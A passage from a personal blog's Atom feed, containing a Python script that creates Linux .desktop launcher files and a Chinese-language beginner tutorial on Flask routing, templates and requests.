    <content type="html"><![CDATA[<h2 id="Profile"><a href="#Profile" class="headerlink" title="Profile"></a>Profile</h2><p>I have writen a blog about how to create a shortcut in  Linux. The way to create a .desktop file was introduced by me in that blog article named “Desktop File Learning”. Then I design a script that is based on Python3 to create the .desktop quickly and  conveniently, we can save the step to move the .desktop to the right directory.</p><p>I have tested this script on Ubuntu and Deepin.</p><p>Source Code:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">def</span> <span class="token function">CreateIcon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    file_name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入应用名称："</span><span class="token punctuation">)</span>    file_fullname <span class="token operator">=</span> <span class="token string">"/usr/share/applications/"</span> <span class="token operator">+</span> file_name <span class="token operator">+</span> <span class="token string">".desktop"</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_fullname<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>    exec_path <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入二进制文件地址（绝对地址）:"</span><span class="token punctuation">)</span>    icon_path <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入图标地址（绝对地址）:"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1.Development;IDE;\n2.Office;\n3.System;\n4.Network;\n5.chat;\n6.Audio;AudioVideo;\n7.Player;AudioVideo;"</span>          <span class="token string">"\n8.Graphics"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        categoriesNum <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请选择你的应用类型："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请输入相应的序号！！！"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> categoriesNum <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">:</span>            categoriesTable <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"Development;IDE;"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"Office;"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"System;"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"Network;"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"chat;"</span><span class="token punctuation">,</span>                               <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"Audio;AudioVideo;"</span><span class="token punctuation">,</span>                               <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"Player;AudioVideo;"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"Graphics;"</span><span class="token punctuation">&#125;</span>            categories <span class="token operator">=</span> categoriesTable<span class="token punctuation">[</span>categoriesNum<span class="token punctuation">]</span>            text <span class="token operator">=</span> <span class="token string">"[Desktop Entry]\nName="</span> <span class="token operator">+</span> file_name <span class="token operator">+</span> <span class="token string">"\nType=Application\nTerminal=False\nExec="</span> <span class="token operator">+</span> exec_path <span class="token operator">+</span> \                   <span class="token string">"\nIcon="</span> <span class="token operator">+</span> icon_path <span class="token operator">+</span> <span class="token string">"\nCategories="</span> <span class="token operator">+</span> categories            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>text<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"输入的数字过大了!!!"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    CreateIcon<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>I can use this script to create the shortcut in launcher more quickly.</p><h2 id="How-to-use-it"><a href="#How-to-use-it" class="headerlink" title="How to use it"></a>How to use it</h2><p>Firstly, you need to configure a Python3 environment.</p><p>Then, run the script via root user.</p><p>For example: <code>python3 linux-shotcut-maker.py</code>(root user) or  <code>sudo python3 linux-shotcut-maker.py</code></p><h2 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h2><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210406230702.png" alt="使用截图"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Profile&quot;&gt;&lt;a href=&quot;#Profile&quot; class=&quot;headerlink&quot; title=&quot;Profile&quot;&gt;&lt;/a&gt;Profile&lt;/h2&gt;&lt;p&gt;I have writen a blog about how to create a shortcu</summary>
      
    
    
    
    <category term="资源教程" scheme="http://yoursite.com/categories/%E8%B5%84%E6%BA%90%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
    <category term="Deepin" scheme="http://yoursite.com/tags/Deepin/"/>
    
  </entry>
  
  <entry>
    <title>Flask框架学习(二)</title>
    <link href="http://yoursite.com/post/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E4%BA%8C.html"/>
    <id>http://yoursite.com/post/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0-%E4%BA%8C.html</id>
    <published>2021-03-01T04:07:21.000Z</published>
    <updated>2021-04-21T16:00:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Flask小应用"><a href="#Flask小应用" class="headerlink" title="Flask小应用"></a>Flask小应用</h2><p>最简单的Flask小程序就是hello world了，下面用flask写一个hello world：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello World'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Flask类的一个对象是我们的<strong>WSGI</strong>应用程序。Flask构造函数使用<strong>当前模块（__name __）</strong>的名称作为参数。</p><p>Flask类的**route()**函数是一个装饰器，它告诉应用程序哪个URL应该调用相关的函数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>rule<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token comment">#rule 参数表示与该函数的URL绑定。</span><span class="token comment">#options 是要转发给基础Rule对象的参数列表。</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> debug<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token comment">#host:表示要监听的主机名，默认是127.0.0.1。如果要让服务器在外部可以使用就要设置为0.0.0.0</span><span class="token comment">#port:默认为使用5000，也可以按照需求自定义端口</span><span class="token comment">#debug:默认为False，如果设置为True，则提供调试信息</span><span class="token comment">#options:要转发到底层的Werkzeug服务器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果程序还在开发调试过程中，可以开启调试模式，即设置debug为True，这样如果代码修改，服务器将会auto reload。</p><h2 id="Flask路由"><a href="#Flask路由" class="headerlink" title="Flask路由"></a>Flask路由</h2><p>现在Web框架使用路由技术来帮助用户记住应用程序URL。可以直接访问所需的页面，而无需从主页导航。上面也提到了route()装饰器用于将URL绑定到函数。除了使用route来绑定路由和函数，还可以使用add_url_rule()来进行绑定。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">hello_word</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'hello world'</span>app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> hello_world<span class="token punctuation">)</span><span class="token comment">#与下方写法目的上一样</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'hello world'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask变量规则"><a href="#Flask变量规则" class="headerlink" title="Flask变量规则"></a>Flask变量规则</h2><p>通过向规则参数添加变量部分，可以动态构建URL。此变量部分标记为<code>&lt;variable-name&gt; </code>。它作为关键字参数传递给与规则相关联的函数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello %s!'</span> <span class="token operator">%</span> name<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果在URL访问<a href="http://127.0.0.1:5000/hello/A1andNS">http://127.0.0.1:5000/hello/A1andNS</a></p><p>浏览器将会输出：Hello A1andNS！</p><p>这里的变量部分默认是str类型，当然也有其他的类型是可以用的。例如int、float、path类型都是可以的。而要接收这些类型的变量，见下方实例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/blog/&lt;int:postID>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_blog</span><span class="token punctuation">(</span>postID<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Blog Number $d'</span> <span class="token operator">%</span> postID<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Flask的URL规则基于<strong>Werkzeug</strong>的路由模块。这确保形成的URL是唯一的，并且基于Apache规定的先例。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Code 1:</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flask'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_flask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello Flask'</span><span class="token comment">#Code 2:</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flask/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_flask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello Flask'</span><span class="token comment">#这两种路由规则看着相同实际不同，Code1中的规则，让我们在浏览器中只有访问http://127.0.0.1:5000/flask才能成功，如果访问http://127.0.0.1:5000/flask/则会出现404 Not Found错误，但是如果是/flask/的写法，则是规范的URL，/flask或/flask/都是可以访问的。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask-URL构建"><a href="#Flask-URL构建" class="headerlink" title="Flask URL构建"></a><strong>Flask URL构建</strong></h2><p>**url_for()**函数对于动态构建特定函数的URL非常有用。该函数接受函数的名称作为第一个参数，以及一个或多个关键字参数，每个参数对应于URL的变量部分。</p><p>以下脚本演示了如何使用**url_for()**函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_forapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'Hello Admin'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/guest/&lt;guest>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> hello_guest<span class="token punctuation">(</span>guest<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">return</span> <span class="token string">'Hello %s as Guest'</span> <span class="token operator">%</span> guest<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_user</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> name <span class="token operator">==</span><span class="token string">'admin'</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'hello_admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'hello_guest'</span><span class="token punctuation">,</span>guest <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述脚本有一个函数**user(name)**，它接受来自URL的参数的值。</p><p>**User()<strong>函数检查接收的参数是否与</strong>‘admin’<strong>匹配。如果匹配，则使用</strong>url_for()<strong>将应用程序重定向到</strong>hello_admin()<strong>函数，否则重定向到将接收的参数作为guest参数传递给它的</strong>hello_guest()**函数。</p><p>打开浏览器并输入URL - <strong><a href="http://localhost:5000/hello/admin">http://localhost:5000/user/admin</a></strong></p><p>浏览器中的应用程序响应是：</p><pre class="line-numbers language-none"><code class="language-none">Hello Admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在浏览器中输入以下URL - <strong><a href="http://localhost:5000/hello/mvl">http://localhost:5000/user/mvl</a></strong></p><p>应用程序响应现在更改为：</p><pre class="line-numbers language-none"><code class="language-none">Hello mvl as Guest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Flask-HTTP方法"><a href="#Flask-HTTP方法" class="headerlink" title="Flask HTTP方法"></a>Flask HTTP方法</h2><p>Http协议是万维网中数据通信的基础。在该协议中定义了从指定URL检索数据的不同方法。</p><p>下表总结了不同的http方法：</p><table><thead><tr><th>序号</th><th>方法与描述</th></tr></thead><tbody><tr><td>1</td><td><strong>GET</strong>以未加密的形式将数据发送到服务器。最常见的方法。</td></tr><tr><td>2</td><td><strong>HEAD</strong>和GET方法相同，但没有响应体。</td></tr><tr><td>3</td><td><strong>POST</strong>用于将HTML表单数据发送到服务器。POST方法接收的数据不由服务器缓存。</td></tr><tr><td>4</td><td><strong>PUT</strong>用上传的内容替换目标资源的所有当前表示。</td></tr><tr><td>5</td><td><strong>DELETE</strong> 删除由URL给出的目标资源的所有当前表示。</td></tr></tbody></table><p>Flask路由默认响应GET请求，如果需要添加其他的请求方式，可以通过为route()装饰器提供方法参数来更改。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以响应POST类型和GET类型两种类型的请求了。</p><p>对于接受POST类型和GET类型传递的参数，则可以使用到两个方法。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#GET:</span>user <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'nm'</span><span class="token punctuation">)</span><span class="token comment">#POST:</span>user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">(</span><span class="token string">'nm'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask模板"><a href="#Flask模板" class="headerlink" title="Flask模板"></a>Flask模板</h2><p>实际上,视图函数有两个作用:</p><ul><li>处理业务逻辑</li><li>返回响应内容</li></ul><p>在大型应用中,把业务逻辑和表现内容放在一起,会增加代码的复杂度和维护成本.</p><ul><li>模板其实是一个包含响应文本的文件,其中用占位符(变量)表示动态部分,告诉模板引擎其具体的值需要从使用的数据中获取</li><li>使用真实值替换变量,再返回最终得到的字符串,这个过程称为’渲染’</li><li>Flask 是使用 Jinja2 这个模板引擎来渲染模板</li></ul><p>使用模板的好处</p><ul><li>视图函数只负责业务逻辑和数据处理(业务逻辑方面)</li><li>而模板则取到视图函数的数据结果进行展示(视图展示方面)</li><li>代码结构清晰,耦合度低</li></ul><h3 id="模板基本使用"><a href="#模板基本使用" class="headerlink" title="模板基本使用"></a>模板基本使用</h3><p>在项目下创建templates文件加，用于存放所有的模板文件，并在目录下创建模板文件html文件。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建视图函数，将模板内容来进行渲染返回</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'hello.html'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="模板变量"><a href="#模板变量" class="headerlink" title="模板变量"></a>模板变量</h3><p>代码中传入字符串，列表，字典到模板中</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 往模板中传入的数据</span>    my_str <span class="token operator">=</span> <span class="token string">'Hello Word'</span>    my_int <span class="token operator">=</span> <span class="token number">10</span>    my_array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span>    my_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'xiaoming'</span><span class="token punctuation">,</span>        <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">18</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'hello.html'</span><span class="token punctuation">,</span>                           my_str<span class="token operator">=</span>my_str<span class="token punctuation">,</span>                           my_int<span class="token operator">=</span>my_int<span class="token punctuation">,</span>                           my_array<span class="token operator">=</span>my_array<span class="token punctuation">,</span>                           my_dict<span class="token operator">=</span>my_dict                           <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>模板中代码</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  content  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>&#123;&#123; my_str &#125;&#125;  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>&#123;&#123; my_int &#125;&#125;  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>&#123;&#123; my_array &#125;&#125;  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>&#123;&#123; my_dict &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask静态文件"><a href="#Flask静态文件" class="headerlink" title="Flask静态文件"></a>Flask静态文件</h2><p>Web应用程序通常需要静态文件，例如<strong>javascript</strong>文件或支持网页显示的<strong>CSS</strong>文件。通常，配置Web服务器并为您提供这些服务，但在开发过程中，这些文件是从您的包或模块旁边的<em>static</em>文件夹中提供，它将在应用程序的**/static**中提供。</p><p>下面就是从/static中获取hello.js脚本的方式。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span>          <span class="token attr-name">src</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>&#123;&#123; url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename = <span class="token punctuation">'</span>hello.js<span class="token punctuation">'</span>) &#125;&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>sayHello()<span class="token punctuation">"</span></span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>Say Hello<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask-Request对象"><a href="#Flask-Request对象" class="headerlink" title="Flask Request对象"></a>Flask Request对象</h2><p>来自客户端网页的数据作为全局请求对象发送到服务器。为了处理请求数据，应该从Flask模块导入。</p><p>Request对象的重要属性如下所列：</p><ul><li><strong>Form</strong> - 它是一个字典对象，包含表单参数及其值的键和值对。</li><li><strong>args</strong> - 解析查询字符串的内容，它是问号（？）之后的URL的一部分。</li><li><strong>Cookies</strong> - 保存Cookie名称和值的字典对象。</li><li><strong>files</strong> - 与上传文件有关的数据。</li><li><strong>method</strong> - 当前请求方法。</li></ul><h2 id="Flask-将表单数据发送到模板"><a href="#Flask-将表单数据发送到模板" class="headerlink" title="Flask 